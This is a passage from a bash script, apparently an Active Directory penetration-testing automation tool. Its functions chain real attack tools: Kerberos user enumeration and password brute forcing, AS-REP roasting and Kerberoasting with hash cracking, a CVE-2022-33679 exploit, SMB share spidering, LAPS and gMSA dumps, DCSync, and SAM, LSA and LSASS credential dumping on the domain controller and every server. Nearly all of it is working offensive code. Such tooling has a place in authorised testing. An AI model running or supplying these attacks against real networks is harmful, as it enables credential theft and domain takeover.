    echo -e ""
}

certipy_enum () {
    if [[ ! -f "${certipy}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd ${output_dir}/DomainRecon/ADCS
            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap | tee -a ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

kerbrute_enum () {
    echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        if [ ! -f "${scripts_dir}/kerbrute" ] ; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
            "${scripts_dir}/kerbrute" userenum ${users_list} -d ${dc_domain} --dc ${dc_ip} -t 5 > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>&1
            fi
        fi
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration can only be executed without credentials${NC}"
    fi 
    echo -e ""
}

userpass_kerbrute_check () {
    if [ ! -f "${scripts_dir}/kerbrute" ] ; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        user_pass_wordlist="${output_dir}/Kerberos/kerbrute_userpass_wordlist_${dc_domain}.txt"
        
        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ -s "${known_users_list}" ] ; then
            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
            /bin/rm "${user_pass_wordlist}" 2>/dev/null
            for i in $(/bin/cat ${known_users_list}); do
                echo -e "${i}:${i}" >> "${user_pass_wordlist}"
            done
            "${scripts_dir}/kerbrute" bruteforce "${user_pass_wordlist}" -d ${dc_domain} --dc ${dc_ip} -t 5 > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        else
            echo -e "${PURPLE}[-] No known users found. Run user enumeraton (crackmapexec, ldapdomaindump, enum4linux or windapsearch) and try again.${NC}"
        fi
    fi
    echo -e ""
}

asrep_attack () {
    if [ ! -f "${impacket_GetNPUsers}" ]; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        
        echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            if [ -s "${known_users_list}" ] ; then
                users_scan_list=${known_users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                users_scan_list=${users_list}
            fi
            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        else
            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip}
            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
        fi
        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' | tee ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
        fi
    fi 
    echo -e ""
}

asreprc4_attack () {
    echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
    if [ ! -f "${scripts_dir}/CVE-2022-33679.py" ] ; then
        echo -e "${RED}[-] Please verify the location of CVE-2022-33679.py${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            if [ ! -f "${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt" ]; then
                asrep_attack
            fi
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                ${python} ${scripts_dir}/CVE-2022-33679.py ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt 2>&1
                cd ${current_dir}
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${PURPLE}[-] CVE-2022-33679 can only be executed without credentials${NC}"
        fi
    fi
    echo -e ""
}

kerberoast_attack () {
    if [ ! -f "${impacket_GetUserSPNs}" ]; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
            /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
            echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
            asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
                if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' | tee ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
            fi

        else
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                    echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                else
                    /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
            fi
        fi
    fi 
    echo -e ""
}

john_crack_asrep(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            $john ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberos/asreproast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

john_crack_kerberoast(){
    if [ ! -f "${john}" ] ; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_list wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            $john ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberos/kerberoast_john_results_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

smb_map_dc () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] SMB shares Enumeration on DC${NC}"
        if [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
        else
            echo -e "${CYAN}[*] Listing accessible SMB shares - Step 1/2${NC}"
            ${smbmap} -H ${dc_ip} ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${dc_ip}.txt 2>&1

            echo -e "${CYAN}[*] Listing files in accessible shares - Step 2/2${NC}"
            current_dir=$(pwd)
            mkdir -p ${output_dir}/Shares/SharesDump/${dc_ip}
            cd ${output_dir}/Shares/SharesDump/${dc_ip}
            ${smbmap} -H ${dc_ip} ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${dc_ip}.txt 2>&1
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

smb_map () {
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] SMB shares Enumeration${NC}"
        smb_scan
        echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            fi
        done

        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
        grep -iaH READ ${output_dir}/Shares/SharesDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.txt

        echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                current_dir=$(pwd)
                mkdir -p ${output_dir}/Shares/SharesDump/${i}
                cd ${output_dir}/Shares/SharesDump/${i}
                ${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Shares/SharesDump/smb_files_${dc_domain}_${i}.txt 2>&1
                cd ${current_dir}
            fi
        done
    fi
    echo -e ""
}

shares_cme_dc () {
    echo -e "${BLUE}[*] Enumerating Shares on DC using crackmapexec${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_dc_output${dc_domain}.txt 2>&1 
    echo -e ""
}

shares_cme () {
    echo -e "${BLUE}[*] Enumerating Shares on domain servers using crackmapexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        shares_cme_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

spider_cme_dc () {
    echo -e "${BLUE}[*] Spidering Shares on DC using crackmapexec${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_dc_output${dc_domain}.txt 2>&1
    echo -e ""
}

spider_cme () {
    echo -e "${BLUE}[*] Spidering Shares on domain servers using crackmapexec ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] Targeting DC only${NC}"
        spider_cme_dc
    else
        smb_scan
        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

keepass_scan_dc () {
    echo -e "${BLUE}[*] Search for KeePass-related files and process from DC${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_dc_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

keepass_scan () {
    echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            keepass_scan_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

laps_dump () {
    echo -e "${BLUE}[*] LAPS Dump${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M laps --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
    echo -e ""
}

gmsa_dump () {
    echo -e "${BLUE}[*] gMSA Dump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
    else
        ${crackmapexec} ldap ${dc_ip} ${argument_cme} --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
    fi
    echo -e ""
}

secrets_dump_dc () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Performing DCSync using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
        else
            ${impacket_secretsdump} ${argument_imp}@${dc_ip} -just-dc | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
        fi
    fi
    echo -e ""
}

secrets_dump () {
    if [ ! -f "${impacket_secretsdump}" ] ; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Dumping credentials using secretsdump${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                ${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

sam_dump_dc () { 
    echo -e "${BLUE}[*] Dumping SAM from DC using crackmapexec${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

sam_dump () {
    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            sam_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

lsa_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSA secrets from DC using crackmapexec${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} --lsa | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

lsa_dump () {
    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            lsa_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

lsassy_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSASS from DC using lsassy${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

lsassy_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            lsassy_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

handlekatz_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSASS from DC using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

handlekatz_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            handlekatz_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

procdump_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSASS from DC using procdump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

procdump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            procdump_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

nanodump_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSASS from DC using nanodump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        ${crackmapexec} smb ${target_dc} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${dc_ip}.txt
    fi
    echo ""
}

nanodump_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DC only${NC}"
            nanodump_dump_dc
        else
            smb_scan
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
            done
        fi
    fi
    echo -e ""
}

donpapi_dump_dc () {
    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets from DC using DonPAPI${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            ${python} ${donpapi_dir}/DonPAPI.py ${argument_donpapi}@${dc_ip} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${dc_ip}.txt
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

donpapi_dump () {
    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            smb_scan
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                ${python} ${donpapi_dir}/DonPAPI.py ${argument_donpapi}@${i} -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
            done
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

masky_dump_dc () {
    echo -e "${BLUE}[*] Dumping LSASS from DC using masky (ADCS required)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
            adcs_enum
        fi
        pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
        pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
        if [ ! "${pki_server}" == "" ] && [ ! "${pki_ca}" == "" ]; then
            ${crackmapexec} smb ${target_dc} ${argument_cme} -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${dc_ip}.txt
        else
            echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
        fi
    fi
    echo ""
}

masky_dump () {
    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ ! -f "${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt" ]; then
            adcs_enum
        fi
        pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
        pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
